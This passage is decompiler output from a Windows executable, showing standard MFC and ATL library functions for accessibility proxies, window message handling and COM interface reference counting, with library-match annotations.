//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accHelpTopic(wchar_t * *,struct tagVARIANT,long *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accHelpTopic
          (int param_1,int param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6,int param_7)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if ((param_2 == 0) || (param_7 == 0)) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x40))(piVar1,param_2,param_3,param_4,param_5,param_6,param_7);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accKeyboardShortcut(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accKeyboardShortcut
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          int param_6)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if (param_6 == 0) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x44))(piVar1,param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accFocus(struct tagVARIANT *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accFocus(tagVARIANT *param_1)

{
  long lVar1;
  int in_stack_00000008;
  
  if (*(int *)(param_1 + 8) == 0) {
    lVar1 = -0x7ffefef8;
  }
  else if (in_stack_00000008 == 0) {
    lVar1 = -0x7fffbffd;
  }
  else {
    lVar1 = (**(code **)(**(int **)(param_1 + 8) + 0x48))(*(int **)(param_1 + 8));
  }
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accSelection(struct tagVARIANT *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accSelection(tagVARIANT *param_1)

{
  long lVar1;
  int in_stack_00000008;
  
  if (*(int *)(param_1 + 8) == 0) {
    lVar1 = -0x7ffefef8;
  }
  else if (in_stack_00000008 == 0) {
    lVar1 = -0x7fffbffd;
  }
  else {
    lVar1 = (**(code **)(**(int **)(param_1 + 8) + 0x4c))(*(int **)(param_1 + 8));
  }
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::get_accDefaultAction(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::get_accDefaultAction
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          int param_6)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if (param_6 == 0) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x50))(piVar1,param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::accSelect(long,struct tagVARIANT)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::accSelect
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x54))(piVar1,param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::accLocation(long *,long *,long *,long *,struct tagVARIANT)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::accLocation
          (int param_1,int param_2,int param_3,int param_4,int param_5,undefined4 param_6,
          undefined4 param_7,undefined4 param_8,undefined4 param_9)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if ((((param_2 == 0) || (param_3 == 0)) || (param_4 == 0)) || (param_5 == 0)) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x58))
                      (piVar1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::accNavigate(long,struct tagVARIANT,struct tagVARIANT *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::accNavigate
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6,int param_7)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else if (param_7 == 0) {
    uVar2 = 0x80004003;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 0x5c))(piVar1,param_2,param_3,param_4,param_5,param_6,param_7);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::accHitTest(long,long,struct tagVARIANT *)
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release,
// Visual Studio 2010 Release

long ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::accHitTest
               (long param_1,long param_2,tagVARIANT *param_3)

{
  long lVar1;
  int in_stack_00000010;
  
  if (*(int *)(param_1 + 8) == 0) {
    lVar1 = -0x7ffefef8;
  }
  else if (in_stack_00000010 == 0) {
    lVar1 = -0x7fffbffd;
  }
  else {
    lVar1 = (**(code **)(**(int **)(param_1 + 8) + 0x60))(*(int **)(param_1 + 8),param_2,param_3);
  }
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::accDoDefaultAction(struct tagVARIANT)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4
ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::accDoDefaultAction
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5)

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = *(int **)(param_1 + 8);
  if (piVar1 == (int *)0x0) {
    uVar2 = 0x80010108;
  }
  else {
    uVar2 = (**(code **)(*piVar1 + 100))(piVar1,param_2,param_3,param_4,param_5);
  }
  return uVar2;
}



int FUN_004108c1(int param_1)

{
  return (-(uint)(*(int *)(param_1 + 8) != 0) & 0xffff3ef9) + 0x80010108;
}



undefined4 FUN_004108de(int param_1,undefined4 param_2,undefined4 param_3)

{
  *(undefined4 *)(param_1 + 4) = param_2;
  *(undefined4 *)(param_1 + 8) = param_3;
  return 0;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::Invoke(long,struct _GUID const &,unsigned long,unsigned short,struct
// tagDISPPARAMS *,struct tagVARIANT *,struct tagEXCEPINFO *,unsigned int *)
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release,
// Visual Studio 2010 Release

long ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::Invoke
               (long param_1,_GUID *param_2,ulong param_3,ushort param_4,tagDISPPARAMS *param_5,
               tagVARIANT *param_6,tagEXCEPINFO *param_7,uint *param_8)

{
  long lVar1;
  undefined2 in_stack_00000012;
  
  if (*(int *)(param_1 + 8) == 0) {
    lVar1 = -0x7ffefef8;
  }
  else {
    lVar1 = (**(code **)(**(int **)(param_1 + 8) + 0x18))
                      (*(int **)(param_1 + 8),param_2,param_3,_param_4,param_5,param_6,param_7,
                       param_8);
  }
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::GetIDsOfNames(struct _GUID const &,wchar_t * *,unsigned int,unsigned
// long,long *)
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release,
// Visual Studio 2010 Release

long ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::GetIDsOfNames
               (_GUID *param_1,wchar_t **param_2,uint param_3,ulong param_4,long *param_5)

{
  long lVar1;
  
  if (*(int *)param_1->Data4 == 0) {
    lVar1 = -0x7ffefef8;
  }
  else {
    lVar1 = (**(code **)(**(int **)param_1->Data4 + 0x14))
                      (*(int **)param_1->Data4,param_2,param_3,param_4,param_5);
  }
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __stdcall ATL::IAccessibleProxyImpl<class
// ATL::CAccessibleProxy>::GetTypeInfoCount(unsigned int *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long ATL::IAccessibleProxyImpl<class_ATL::CAccessibleProxy>::GetTypeInfoCount(uint *param_1)

{
  long lVar1;
  
  if (param_1[2] == 0) {
    lVar1 = -0x7ffefef8;
  }
  else {
    lVar1 = (**(code **)(*(int *)param_1[2] + 0xc))((int *)param_1[2]);
  }
  return lVar1;
}



undefined4 FUN_00410988(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 uVar1;
  
  if (*(int *)(param_1 + 8) == 0) {
    uVar1 = 0x80010108;
  }
  else {
    uVar1 = (**(code **)(**(int **)(param_1 + 8) + 0x10))
                      (*(int **)(param_1 + 8),param_2,param_3,param_4);
  }
  return uVar1;
}



// Library Function - Single Match
//  public: class CWnd * __thiscall CWnd::GetWindow(unsigned int)const 
// 
// Library: Visual Studio 2008 Release

CWnd * __thiscall CWnd::GetWindow(CWnd *this,uint param_1)

{
  HWND pHVar1;
  CWnd *pCVar2;
  
  pHVar1 = ::GetWindow(*(HWND *)(this + 0x20),param_1);
  pCVar2 = FromHandle(pHVar1);
  return pCVar2;
}



// Library Function - Single Match
//  void __stdcall _AfxPostInitDialog(class CWnd *,struct tagRECT const &,unsigned long)
// 
// Library: Visual Studio 2008 Release

void _AfxPostInitDialog(CWnd *param_1,tagRECT *param_2,ulong param_3)

{
  ulong uVar1;
  CWnd *this;
  int iVar2;
  tagRECT local_14;
  
  if ((((((param_3 & 0x10000000) == 0) &&
        (uVar1 = CWnd::GetExStyle(param_1), (uVar1 & 0x50000000) == 0)) &&
       (GetWindowRect(*(HWND *)(param_1 + 0x20),&local_14), param_2->left == local_14.left)) &&
      ((param_2->top == local_14.top &&
       ((this = CWnd::GetWindow(param_1,4), this == (CWnd *)0x0 ||
        (iVar2 = CWnd::IsWindowEnabled(this), iVar2 == 0)))))) &&
     (iVar2 = (**(code **)(*(int *)param_1 + 0x124))(), iVar2 != 0)) {
    CWnd::CenterWindow(param_1,(CWnd *)0x0);
  }
  return;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

undefined4
FUN_00410a59(int *param_1,undefined4 param_2,int param_3,undefined4 param_4,undefined4 param_5)

{
  int *piVar1;
  int iVar2;
  CNoTrackObject *pCVar3;
  undefined4 uVar4;
  int iVar5;
  int iVar6;
  int extraout_EDX;
  undefined4 *puVar7;
  undefined4 *puVar8;
  undefined4 local_48 [7];
  tagRECT local_2c;
  CNoTrackObject *local_1c;
  int local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x38;
  local_8 = 0x410a65;
  pCVar3 = CThreadLocalObject::GetData
                     ((CThreadLocalObject *)&DAT_004342f0,(_func_CNoTrackObject_ptr *)&LAB_0040a5ef)
  ;
  iVar6 = 0;
  local_1c = pCVar3;
  if (pCVar3 == (CNoTrackObject *)0x0) {
    AfxThrowNotSupportedException();
    iVar6 = extraout_EDX;
  }
  iVar2 = param_3;
  piVar1 = param_1;
  puVar7 = (undefined4 *)(pCVar3 + 0x58);
  puVar8 = local_48;
  for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar8 = *puVar7;
    puVar7 = puVar7 + 1;
    puVar8 = puVar8 + 1;
  }
  *(undefined4 *)(pCVar3 + 0x58) = param_2;
  *(undefined4 *)(pCVar3 + 0x60) = param_4;
  *(int *)(pCVar3 + 0x5c) = param_3;
  *(undefined4 *)(pCVar3 + 100) = param_5;
  local_8 = iVar6;
  if ((param_3 == 2) && (param_1[0x13] != iVar6)) {
    (**(code **)(*(int *)param_1[0x13] + 0x60))(iVar6);
  }
  param_1 = (int *)0x0;
  if (iVar2 == 0x110) {
    FUN_0040edc7((CWnd *)piVar1,&local_2c,(ulong *)&param_1);
  }
  param_5 = (**(code **)(*piVar1 + 0x110))(iVar2,param_4,param_5);
  if (iVar2 == 0x110) {
    _AfxPostInitDialog((CWnd *)piVar1,&local_2c,(ulong)param_1);
    uVar4 = FUN_00410b36();
    return uVar4;
  }
  puVar7 = local_48;
  puVar8 = (undefined4 *)(pCVar3 + 0x58);
  for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {
    *puVar8 = *puVar7;
    puVar7 = puVar7 + 1;
    puVar8 = puVar8 + 1;
  }
  return param_5;
}



undefined * Catch_00410b0d(void)

{
  long lVar1;
  int unaff_EBP;
  
  lVar1 = AfxProcessWndProcException
                    (*(CException **)(unaff_EBP + -0x14),
                     (tagMSG *)(*(int *)(unaff_EBP + -0x18) + 0x58));
  *(long *)(unaff_EBP + 0x18) = lVar1;
  if (*(int *)(unaff_EBP + -0x14) != 0) {
    FUN_0040a4cb(*(int **)(unaff_EBP + -0x14));
  }
  return &DAT_00410b33;
}



// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

undefined4 FUN_00410b36(void)

{
  undefined4 uVar1;
  int iVar2;
  int unaff_EBX;
  int unaff_EBP;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  uVar1 = *(undefined4 *)(unaff_EBP + 0x18);
  puVar3 = (undefined4 *)(unaff_EBP + -0x44);
  puVar4 = (undefined4 *)(unaff_EBX + 0x58);
  for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
  return uVar1;
}



// Library Function - Single Match
//  long __stdcall AfxWndProc(struct HWND__ *,unsigned int,unsigned int,long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long AfxWndProc(HWND__ *param_1,uint param_2,uint param_3,long param_4)

{
  long lVar1;
  int *piVar2;
  
  if (param_2 == 0x360) {
    lVar1 = 1;
  }
  else {
    piVar2 = (int *)CWnd::FromHandlePermanent(param_1);
    if ((piVar2 == (int *)0x0) || ((HWND__ *)piVar2[8] != param_1)) {
      lVar1 = DefWindowProcW(param_1,param_2,param_3,param_4);
    }
    else {
      lVar1 = FUN_00410a59(piVar2,param_1,param_2,param_3,param_4);
    }
  }
  return lVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual __thiscall CWnd::~CWnd(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CWnd::~CWnd(CWnd *this)

{
  int iVar1;
  
  *(undefined ***)this = vftable;
  if ((((*(int *)(this + 0x20) != 0) && (this != (CWnd *)&DAT_00435ba0)) &&
      (this != (CWnd *)&DAT_00435bf8)) &&
     ((this != (CWnd *)&DAT_00435c50 && (this != (CWnd *)&DAT_00435ca8)))) {
    DestroyWindow(this);
  }
  if (*(int **)(this + 0x4c) != (int *)0x0) {
    (**(code **)(**(int **)(this + 0x4c) + 4))(1);
  }
  iVar1 = *(int *)(this + 0x50);
  if ((iVar1 != 0) && (*(CWnd **)(iVar1 + 0x28) == this)) {
    *(undefined4 *)(iVar1 + 0x28) = 0;
  }
  CCmdTarget::~CCmdTarget((CCmdTarget *)this);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  protected: int __thiscall CWnd::OnCharToItem(unsigned int,class CListBox *,unsigned int)
//  protected: int __thiscall CWnd::OnVKeyToItem(unsigned int,class CListBox *,unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

CWnd * __thiscall FID_conflict_OnCharToItem(void *this,undefined4 param_1,CWnd *param_2)

{
  int iVar1;
  
  if ((param_2 == (CWnd *)0x0) ||
     (iVar1 = CWnd::SendChildNotifyLastMsg(param_2,(long *)&param_2), iVar1 == 0)) {
    param_2 = (CWnd *)CWnd::Default((CWnd *)this);
  }
  return param_2;
}



// Library Function - Single Match
//  protected: void __thiscall CWnd::OnMeasureItem(int,struct tagMEASUREITEMSTRUCT *)
// 
// Library: Visual Studio 2008 Release

void __thiscall CWnd::OnMeasureItem(CWnd *this,int param_1,tagMEASUREITEMSTRUCT *param_2)

{
  CNoTrackObject *pCVar1;
  int *piVar2;
  CWnd *this_00;
  int iVar3;
  
  if (*(int *)param_2 == 1) {
    pCVar1 = CThreadLocalObject::GetData
                       ((CThreadLocalObject *)&DAT_004342f0,
                        (_func_CNoTrackObject_ptr *)&LAB_0040a5ef);
    if (pCVar1 != (CNoTrackObject *)0x0) goto LAB_00410c64;
    do {
      AfxThrowNotSupportedException();
LAB_00410c64:
      if (*(int *)(pCVar1 + 0x74) == *(int *)(this + 0x20)) {
        pCVar1 = (CNoTrackObject *)CMenu::FromHandle(*(HMENU__ **)(pCVar1 + 0x78));
      }
      else {
        pCVar1 = (CNoTrackObject *)(**(code **)(*(int *)this + 0x6c))();
      }
    } while (pCVar1 == (CNoTrackObject *)0x0);
    piVar2 = (int *)_AfxFindPopupMenuFromID((CMenu *)pCVar1,*(uint *)(param_2 + 8));
    if (piVar2 != (int *)0x0) {
      (**(code **)(*piVar2 + 0x10))(param_2);
    }
  }
  else {
    this_00 = GetDescendantWindow(*(HWND__ **)(this + 0x20),*(int *)(param_2 + 4),1);
    if ((this_00 != (CWnd *)0x0) &&
       (iVar3 = SendChildNotifyLastMsg(this_00,(long *)0x0), iVar3 != 0)) {
      return;
    }
  }
  Default(this);
  return;
}



// Library Function - Single Match
//  public: static void __stdcall CWnd::SendMessageToDescendants(struct HWND__ *,unsigned
// int,unsigned int,long,int,int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void CWnd::SendMessageToDescendants
               (HWND__ *param_1,uint param_2,uint param_3,long param_4,int param_5,int param_6)

{
  HWND__ *hWnd;
  int *piVar1;
  HWND pHVar2;
  
  for (hWnd = GetTopWindow(param_1); hWnd != (HWND__ *)0x0; hWnd = ::GetWindow(hWnd,2)) {
    if (param_6 == 0) {
      SendMessageW(hWnd,param_2,param_3,param_4);
    }
    else {
      piVar1 = (int *)FromHandlePermanent(hWnd);
      if (piVar1 != (int *)0x0) {
        FUN_00410a59(piVar1,piVar1[8],param_2,param_3,param_4);
      }
    }
    if (param_5 != 0) {
      pHVar2 = GetTopWindow(hWnd);
      if (pHVar2 != (HWND)0x0) {
        SendMessageToDescendants(hWnd,param_2,param_3,param_4,param_5,param_6);
      }
    }
  }
  return;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  protected: static int __stdcall CWnd::ReflectLastMsg(struct HWND__ *,long *)
// 
// Library: Visual Studio 2008 Release

int CWnd::ReflectLastMsg(HWND__ *param_1,long *param_2)

{
  CHandleMap *pCVar1;
  CWnd *this;
  HWND pHVar2;
  void *pvVar3;
  int iVar4;
  CWnd local_64 [32];
  undefined4 local_44;
  void *local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x54;
  local_8 = 0x410d4f;
  pCVar1 = afxMapHWND(0);
  if (pCVar1 != (CHandleMap *)0x0) {
    this = (CWnd *)CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(pCVar1 + 0x1c),param_1);
    if (this != (CWnd *)0x0) {
      iVar4 = SendChildNotifyLastMsg(this,param_2);
      return iVar4;
    }
    pHVar2 = GetParent(param_1);
    pvVar3 = CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(pCVar1 + 0x1c),pHVar2);
    if (((pvVar3 != (void *)0x0) && (*(int *)((int)pvVar3 + 0x4c) != 0)) &&
       (local_14 = CMapPtrToPtr::GetValueAt
                             ((CMapPtrToPtr *)(*(int *)((int)pvVar3 + 0x4c) + 0x24),param_1),
       local_14 != (void *)0x0)) {
      CWnd(local_64,param_1);
      local_8 = 0;
      iVar4 = SendChildNotifyLastMsg(local_64,param_2);
      local_44 = 0;
      local_8 = 0xffffffff;
      ~CWnd(local_64);
      return (uint)(iVar4 != 0);
    }
  }
  return 0;
}



// Library Function - Single Match
//  protected: void __thiscall CWnd::OnParentNotify(unsigned int,long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CWnd::OnParentNotify(CWnd *this,uint param_1,long param_2)

{
  int iVar1;
  
  if ((((short)param_1 == 1) || ((short)param_1 == 2)) &&
     (iVar1 = ReflectLastMsg((HWND__ *)param_2,(long *)0x0), iVar1 != 0)) {
    return;
  }
  Default(this);
  return;
}



// Library Function - Single Match
//  protected: long __thiscall CWnd::OnDragList(unsigned int,long)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

long __thiscall CWnd::OnDragList(CWnd *this,uint param_1,long param_2)

{
  int iVar1;
  
  iVar1 = ReflectLastMsg(*(HWND__ **)(param_2 + 4),&param_2);
  if (iVar1 == 0) {
    param_2 = Default(this);
  }
  return param_2;
}



// Library Function - Single Match
//  public: __thiscall CMFCComObject<class ATL::CAccessibleProxy>::CMFCComObject<class
// ATL::CAccessibleProxy>(void *)
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release,
// Visual Studio 2010 Release

CMFCComObject<class_ATL::CAccessibleProxy> * __thiscall
CMFCComObject<class_ATL::CAccessibleProxy>::CMFCComObject<class_ATL::CAccessibleProxy>
          (CMFCComObject<class_ATL::CAccessibleProxy> *this,void *param_1)

{
  *(undefined4 *)(this + 0x14) = 0;
  *(undefined4 *)(this + 8) = 0;
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined ***)this = vftable;
  *(undefined ***)(this + 4) = vftable;
  *(undefined ***)(this + 0x10) = vftable;
  AfxOleLockApp();
  return this;
}



// Library Function - Single Match
//  _InlineIsEqualGUID
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl _InlineIsEqualGUID(int *param_1,int *param_2)

{
  if ((((*param_1 == *param_2) && (param_1[1] == param_2[1])) && (param_1[2] == param_2[2])) &&
     (param_1[3] == param_2[3])) {
    return 1;
  }
  return 0;
}



undefined4 FUN_00410e9e(void)

{
  return 0;
}



undefined4 FUN_00410ea3(void)

{
  return 0x80004001;
}



undefined4 __fastcall FUN_00410eab(int param_1)

{
  undefined4 uVar1;
  
  if (*(int *)(param_1 + 0xc) == 0) {
    return 0;
  }
  uVar1 = (**(code **)(**(int **)(param_1 + 0xc) + 0xc))(*(int **)(param_1 + 0xc),0);
  return uVar1;
}



// Library Function - Single Match
//  int __stdcall ATL::InlineIsEqualUnknown(struct _GUID const &)
// 
// Library: Visual Studio 2008 Release

int ATL::InlineIsEqualUnknown(_GUID *param_1)

{
  int iVar1;
  
  if ((((param_1->Data1 == 0) &&
       (iVar1._0_2_ = param_1->Data2, iVar1._2_2_ = param_1->Data3, iVar1 == 0)) &&
      (*(int *)param_1->Data4 == 0xc0)) && (*(int *)(param_1->Data4 + 4) == 0x46000000)) {
    iVar1 = 1;
  }
  else {
    iVar1 = 0;
  }
  return iVar1;
}



// Library Function - Single Match
//  long __stdcall ATL::AtlInternalQueryInterface(void *,struct ATL::_ATL_INTMAP_ENTRY const
// *,struct _GUID const &,void * *)
// 
// Library: Visual Studio 2008 Release

long ATL::AtlInternalQueryInterface
               (void *param_1,_ATL_INTMAP_ENTRY *param_2,_GUID *param_3,void **param_4)

{
  int *piVar1;
  long lVar2;
  int iVar3;
  int *piVar4;
  
  if ((param_1 == (void *)0x0) || (param_2 == (_ATL_INTMAP_ENTRY *)0x0)) {
    lVar2 = -0x7ff8ffa9;
  }
  else if (param_4 == (void **)0x0) {
    lVar2 = -0x7fffbffd;
  }
  else {
    *param_4 = (void *)0x0;
    iVar3 = InlineIsEqualUnknown(param_3);
    if (iVar3 == 0) {
      for (; piVar4 = *(int **)((int)param_2 + 8), piVar4 != (int *)0x0;
          param_2 = (_ATL_INTMAP_ENTRY *)((int)param_2 + 0xc)) {
        piVar1 = *(int **)param_2;
        if ((piVar1 == (int *)0x0) ||
           (iVar3 = _InlineIsEqualGUID(piVar1,(int *)param_3), iVar3 != 0)) {
          if (piVar4 == (int *)0x1) goto LAB_00410f26;
          iVar3 = (*(code *)piVar4)(param_1,param_3,param_4,*(int **)((int)param_2 + 4));
          if (iVar3 == 0) {
            return 0;
          }
          if ((piVar1 != (int *)0x0) && (iVar3 < 0)) {
            return iVar3;
          }
        }
      }
      lVar2 = -0x7fffbffe;
    }
    else {
LAB_00410f26:
      piVar4 = (int *)((int)*(int **)((int)param_2 + 4) + (int)param_1);
      (**(code **)(*piVar4 + 4))(piVar4);
      *param_4 = piVar4;
      lVar2 = 0;
    }
  }
  return lVar2;
}



// Library Function - Single Match
//  public: long __thiscall ATL::CAccessibleProxy::_InternalQueryInterface(struct _GUID const &,void
// * *)
// 
// Library: Visual Studio 2008 Release

long __thiscall
ATL::CAccessibleProxy::_InternalQueryInterface(CAccessibleProxy *this,_GUID *param_1,void **param_2)

{
  long lVar1;
  
  lVar1 = AtlInternalQueryInterface(this,(_ATL_INTMAP_ENTRY *)&PTR_DAT_0042a058,param_1,param_2);
  return lVar1;
}



void __fastcall FUN_00410fad(undefined4 *param_1)

{
  *param_1 = CMFCComObject<class_ATL::CAccessibleProxy>::vftable;
  param_1[1] = CMFCComObject<class_ATL::CAccessibleProxy>::vftable;
  param_1[4] = CMFCComObject<class_ATL::CAccessibleProxy>::vftable;
  param_1[5] = 0xc0000001;
  FUN_00410eab((int)param_1);
  FUN_00413b04();
  return;
}



undefined4 FUN_00410fd2(int param_1)

{
  *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 1;
  return *(undefined4 *)(param_1 + 0x14);
}



// Library Function - Single Match
//  public: virtual unsigned long __stdcall CMFCComObject<class
// ATL::CAccessibleProxy>::Release(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

ulong CMFCComObject<class_ATL::CAccessibleProxy>::Release(void)

{
  int *piVar1;
  ulong uVar2;
  int *in_stack_00000004;
  
  piVar1 = in_stack_00000004 + 5;
  *piVar1 = *piVar1 + -1;
  uVar2 = in_stack_00000004[5];
  if ((*piVar1 == 0) && (in_stack_00000004 != (int *)0x0)) {
    (**(code **)(*in_stack_00000004 + 0x70))(1);
  }
  return uVar2;
}



// Library Function - Single Match
//  public: virtual long __stdcall CMFCComObject<class ATL::CAccessibleProxy>::QueryInterface(struct
// _GUID const &,void * *)
// 
// Library: Visual Studio 2008 Release

long CMFCComObject<class_ATL::CAccessibleProxy>::QueryInterface(_GUID *param_1,void **param_2)

{
  long lVar1;
  void **in_stack_0000000c;
  
  lVar1 = ATL::CAccessibleProxy::_InternalQueryInterface
                    ((CAccessibleProxy *)param_1,(_GUID *)param_2,in_stack_0000000c);
  return lVar1;
}



undefined4 * __thiscall FUN_0041101e(void *this,byte param_1)

{
  FUN_00410fad((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (undefined4 *)this;
}



void FUN_0041103f(undefined4 param_1)

{
  CMFCComObject<class_ATL::CAccessibleProxy>::Release();
  return;
}



void FUN_00411049(int param_1,void **param_2)

{
  CMFCComObject<class_ATL::CAccessibleProxy>::QueryInterface((_GUID *)(param_1 + -4),param_2);
  return;
}



void FUN_00411053(int param_1)

{
  FUN_00410fd2(param_1 + -0x10);
  return;
}



void FUN_0041105d(int param_1,void **param_2)

{
  CMFCComObject<class_ATL::CAccessibleProxy>::QueryInterface((_GUID *)(param_1 + -0x10),param_2);
  return;
}



void FUN_00411067(undefined4 param_1)

{
  CMFCComObject<class_ATL::CAccessibleProxy>::Release();
  return;
}



void FUN_00411071(int param_1)

{
  FUN_00410fd2(param_1 + -4);
  return;
}



// Library Function - Single Match
//  public: class CWnd * __thiscall CWnd::GetOwner(void)const 
// 
// Library: Visual Studio 2008 Release

CWnd * __thiscall CWnd::GetOwner(CWnd *this)

